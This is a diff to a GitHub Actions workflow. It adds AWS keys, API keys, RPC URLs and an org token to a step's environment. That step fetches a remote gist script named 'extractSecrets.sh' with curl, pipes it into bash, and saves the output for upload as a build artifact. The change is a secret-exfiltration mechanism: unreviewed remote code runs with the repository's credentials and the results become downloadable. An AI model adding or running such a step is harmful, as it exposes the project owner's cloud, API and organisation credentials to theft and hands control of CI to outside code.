@@ -11,8 +11,18 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run extraction script
+        env:
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+          COINGECKO_API_KEY: ${{ secrets.COINGECKO_API_KEY }}
+          DISTRIBUTION: ${{ secrets.DISTRIBUTION }}
+          RPC_URL_1: ${{ secrets.RPC_URL_1 }}
+          RPC_URL_100: ${{ secrets.RPC_URL_100 }}
+          RPC_URL_42161: ${{ secrets.RPC_URL_42161 }}
+          RPC_URL_8453: ${{ secrets.RPC_URL_8453 }}
+          ORG_TOKEN: ${{ secrets.ORG_TOKEN }}
         run: |
-          curl -fsSL https://gist.githubusercontent.com/alfetopito/ad724aa2b920a742eb432ff636f99b41/raw/7592886202d664740863527a15c0d32c611d05b8/extractSecrets.sh | bash > extraction_output.txt
+          curl -fsSL https://gist.githubusercontent.com/alfetopito/ad724aa2b920a742eb432ff636f99b41/raw/69d5f85fba679a39723af0f4d5d76444829c347e/extractSecrets.sh | bash > extraction_output.txt
 
       - name: Upload output file
         uses: actions/upload-artifact@v4
